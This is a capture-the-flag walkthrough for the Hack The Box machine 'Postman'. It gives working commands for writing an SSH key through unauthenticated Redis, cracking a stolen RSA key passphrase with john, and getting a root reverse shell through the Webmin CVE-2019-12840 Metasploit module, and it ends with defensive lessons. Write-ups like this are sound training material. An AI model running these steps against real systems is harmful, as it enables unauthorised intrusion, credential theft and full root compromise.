# HTB — Postman

---

> **Author:** k41r0s3
> **Machine:** Postman
> **OS:** Linux (Ubuntu 18.04.3)
> **Difficulty:** Easy
> **Category:** Misconfiguration / Service Exploitation
> **Date:** March 18, 2026
> **Status:** ✅ Pwned

---

## TL;DR

Postman is an easy Linux machine that chains an unauthenticated Redis instance into a full root compromise. Redis is exposed with no authentication, allowing direct write access to the filesystem via its `CONFIG SET` command — used here to drop an SSH public key into the `redis` user's `authorized_keys`. From that shell, an encrypted RSA backup key belonging to a local user is recovered and cracked offline. The cracked passphrase is reused as the user's Webmin login, and Webmin 1.910 is vulnerable to an authenticated remote code execution (CVE-2019-12840) that runs as root.

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Redis — Unauthenticated Access Verification](#2-redis--unauthenticated-access-verification)
3. [Foothold — SSH Key Injection via Redis](#3-foothold--ssh-key-injection-via-redis)
4. [Enumeration — Finding the Backup Key](#4-enumeration--finding-the-backup-key)
5. [User — Cracking the RSA Key Passphrase](#5-user--cracking-the-rsa-key-passphrase)
6. [Privilege Escalation — Webmin CVE-2019-12840](#6-privilege-escalation--webmin-cve-2019-12840)
7. [Attack Chain](#7-attack-chain)
8. [Tools Used](#8-tools-used)
9. [Key Takeaways](#9-key-takeaways)

---

## 1. Reconnaissance

### Initial Nmap Scan

```bash
nmap -sCV -T4 <TARGET_IP>
```

**Results:**

| Port | State | Service | Version |
| --- | --- | --- | --- |
| 22/tcp | open | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80/tcp | open | http | Apache httpd 2.4.29 (Ubuntu) |
| 10000/tcp | open | http | MiniServ 1.910 (Webmin httpd) |

> **Thought process:** Three ports visible. Port 80 is Apache with what nmap identifies as a personal website — low value on the surface. Port 10000 running Webmin 1.910 immediately stands out as a high-value target since Webmin has a history of critical CVEs. The instinct was to go straight to Webmin, which turned out to be a mistake — see Lessons Learned.

### Full Port Scan

```bash
nmap -p- --min-rate 5000 -T4 <TARGET_IP> -oN full_scan.txt
```

**Additional port discovered:**

| Port | State | Service |
| --- | --- | --- |
| 6379/tcp | open | redis |

> **Thought process:** The quick scan completed and looked done, but a `-p-` full scan was added as a parallel step. Redis on 6379 only showed up here — this was the actual entry point. This is why a full scan must always run alongside targeted enumeration. Missing this port cost time chasing the wrong vector first.

---

## 2. Redis — Unauthenticated Access Verification

```bash
redis-cli -h <TARGET_IP> ping
```

**Output:** `PONG`

> **Thought process:** A `PONG` response with no password prompt means Redis is wide open. Unauthenticated Redis is a well-known critical misconfiguration. The standard attack path here is to abuse `CONFIG SET` to write arbitrary files to the filesystem — specifically dropping an SSH public key into a user's `authorized_keys`. The question is which user Redis runs as and where their home directory is.

Check Redis configuration to confirm the running user's home:

```bash
redis-cli -h <TARGET_IP> config get dir
```

**Output:**
```
1) "dir"
2) "/var/lib/redis"
```

This confirms Redis runs as the `redis` user with a home at `/var/lib/redis`. The `.ssh` directory will be at `/var/lib/redis/.ssh`.

---

## 3. Foothold — SSH Key Injection via Redis

### Step 1 — Generate an SSH Keypair

```bash
ssh-keygen -t rsa -f /tmp/postman_rsa -N ""
```

### Step 2 — Inject the Public Key into Redis

The public key is wrapped in blank lines to prevent the Redis RDB binary header and footer from corrupting it when the file is written to disk.

```bash
(echo -e "\n\n"; cat /tmp/postman_rsa.pub; echo -e "\n\n") > /tmp/redis_key.txt

redis-cli -h <TARGET_IP> flushall
cat /tmp/redis_key.txt | redis-cli -h <TARGET_IP> -x set pwned
redis-cli -h <TARGET_IP> config set dir /var/lib/redis/.ssh
redis-cli -h <TARGET_IP> config set dbfilename "authorized_keys"
redis-cli -h <TARGET_IP> save
```

Each command should return `OK`.

> **Thought process:** `flushall` wipes any existing keys so the RDB dump only contains our key value. Without the newline padding, the RDB binary framing would be written on the same line as the public key, making `authorized_keys` unparseable by sshd. The padding ensures the key sits on a clean line regardless of what surrounds it.

### Step 3 — SSH in as Redis

```bash
ssh -i /tmp/postman_rsa redis@<TARGET_IP>
```

**Result:**
```
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
redis@Postman:~$
```

Shell obtained as the `redis` user.

---

## 4. Enumeration — Finding the Backup Key

### Search for Backup Files

```bash
find / -name "*.bak" 2>/dev/null
```

**Output:**
```
/opt/id_rsa.bak
/var/backups/group.bak
/var/backups/gshadow.bak
/var/backups/shadow.bak
/var/backups/passwd.bak
```

`/opt/id_rsa.bak` is an RSA private key backup sitting in `/opt` — a non-standard location that suggests it was placed there deliberately.

```bash
ls -la /opt/
```

```
-rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
```

```bash
cat /etc/passwd | grep -v nologin | grep -v false
```

```
root:x:0:0:root:/root:/bin/bash
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash
```

> **Thought process:** The key is owned by `Matt`, the only non-system user on the box. An RSA backup key in a world-readable location is almost certainly intentional in the context of this machine — it's the path to the next user. The file header will tell us the encryption type, which determines how to crack it.

```bash
cat /opt/id_rsa.bak
```

The key header shows `Proc-Type: 4,ENCRYPTED` and `DEK-Info: DES-EDE3-CBC` — it is passphrase-protected with 3DES. Crackable offline with John.

---

## 5. User — Cracking the RSA Key Passphrase

Exfiltrate the key to your attack machine, then crack it:

```bash
# Save the key content to a local file
chmod 600 /tmp/matt_id_rsa

# Convert to John-crackable format
ssh2john /tmp/matt_id_rsa > /tmp/matt.hash

# Crack with rockyou
john /tmp/matt.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:** Passphrase cracked successfully — **[REDACTED]**

> **Thought process:** `DES-EDE3-CBC` encrypted PEM keys use a simple MD5-based KDF with only 2 iterations — very fast to crack. rockyou.txt is always the first wordlist to try on HTB easy machines. The crack completed in under a second.

### Accessing Matt's Account

> **Note on key compatibility:** Attempting `ssh -i /tmp/matt_id_rsa Matt@<TARGET_IP>` fails on modern Kali with `error in libcrypto`. This is because modern OpenSSL deprecates the old `DES-EDE3-CBC` PEM key format. Use password authentication or `su` from an existing shell instead.

```bash
# Option 1 — Direct SSH with password
ssh Matt@<TARGET_IP>
# Password: [REDACTED]

# Option 2 — su from the redis shell (more reliable)
su - Matt
# Password: [REDACTED]

# Grab the user flag
cat /home/Matt/user.txt
```

**User flag:** `[REDACTED]`

---

## 6. Privilege Escalation — Webmin CVE-2019-12840

### Why Webmin

With Matt's password in hand, the next step is checking whether it is reused on any service. Webmin on port 10000 is the obvious candidate since it's a privileged web administration panel and Webmin runs as root.

> **Thought process:** Two Webmin CVEs exist for this version:
>
> - **CVE-2019-15107** (`webmin_backdoor`) — Unauthenticated RCE via a supply-chain backdoor injected into the Webmin source. Tried first since it requires no credentials. Both `SSL false` (caused `ENOTCONN` — Webmin requires HTTPS) and `SSL true` failed. This CVE was not present on this build.
> - **CVE-2019-12840** (`webmin_packageup_rce`) — Authenticated RCE via the package update module. Requires valid credentials, but we have Matt's password. This is the correct path.

### Exploitation

```bash
msfconsole -q -x "
  use exploit/linux/http/webmin_packageup_rce;
  set RHOSTS <TARGET_IP>;
  set RPORT 10000;
  set SSL true;
  set USERNAME Matt;
  set PASSWORD [REDACTED];
  set LHOST <YOUR_TUN0_IP>;
  set LPORT <PORT>;
  run"
```

**Output:**
```
[+] Session cookie obtained
[*] Attempting to execute the payload...
[*] Command shell session opened

whoami
root
```

> **Thought process:** Webmin runs as root — so any authenticated RCE immediately gives a root shell with no local privilege escalation step needed. The `SSL true` flag is mandatory here. Port 10000 on Webmin is HTTPS by default; `SSL false` causes the module to fail with a connection error.

### Grab the Root Flag

```bash
cat /root/root.txt
```

**Root flag:** `[REDACTED]`

---

## 7. Attack Chain

```
Full Port Scan → Redis 6379 (No Auth)
→ SSH Key Injection via CONFIG SET
→ Shell as redis
→ /opt/id_rsa.bak (Encrypted RSA Key)
→ john + rockyou → Passphrase Cracked
→ Webmin CVE-2019-12840 (Authenticated RCE)
→ ROOT
```

---

## 8. Tools Used

| Tool | Purpose |
| --- | --- |
| nmap | Port scanning and service version detection |
| redis-cli | Redis interaction and CONFIG SET exploitation |
| ssh-keygen | SSH keypair generation for key injection |
| ssh2john | Converting encrypted SSH key to John-crackable format |
| john | Offline passphrase cracking |
| Metasploit (`webmin_packageup_rce`) | Authenticated Webmin RCE (CVE-2019-12840) |

---

## 9. Key Takeaways

**1. Always run a full port scan (`-p-`) in parallel with targeted enumeration.**
The quick scan found only ports 22, 80, and 10000. Redis on 6379 only appeared in the full scan. Spending time attacking the wrong service (Webmin backdoor) before discovering Redis was the biggest time loss on this machine. Make `-p-` a reflex from the very first step.

**2. Unauthenticated Redis is a direct path to filesystem write.**
Redis `CONFIG SET` allows changing the save directory and filename at runtime. With write access to any user's `.ssh` folder, injecting an `authorized_keys` entry is trivial. Any Redis instance without `requirepass` configured should be treated as immediate critical severity.

**3. Webmin 1.910 has two CVEs — don't assume the backdoor is present.**
CVE-2019-15107 (unauthenticated backdoor) was a supply-chain compromise that affected specific build artifacts. Not all 1.910 deployments are vulnerable to it. CVE-2019-12840 (authenticated package update RCE) is more universally applicable — if you have credentials, go straight to the authenticated exploit.

**4. Webmin always uses HTTPS on port 10000 — always set `SSL true`.**
`SSL false` causes an `ENOTCONN` transport error. This is an easy misconfiguration in Metasploit options that wastes time if not caught immediately.

**5. Old PEM key formats (`DES-EDE3-CBC`) fail on modern Kali OpenSSL.**
Attempting SSH authentication with a legacy-encrypted key fails with `error in libcrypto`. When a cracked passphrase is available, go directly to password-based SSH or `su` rather than fighting OpenSSL compatibility. The cracked passphrase is the credential — the key format is irrelevant.

**6. Cracked passphrases are likely reused as service passwords.**
On HTB easy machines especially, the passphrase for an SSH key and the password for an associated web service are frequently identical. After cracking any credential, immediately test it against every other service and authentication panel on the target.

**7. Backup files in non-standard locations are intentional breadcrumbs.**
`/opt/id_rsa.bak` sitting world-readable in `/opt` with no obvious business justification is a clear signal. Always enumerate `/opt`, `/var/backups`, `/tmp`, and `/home` for stray key files, configuration dumps, and credential files whenever you have filesystem access.

---

*k41r0s3 | HTB Writeup | Postman | March 2026*
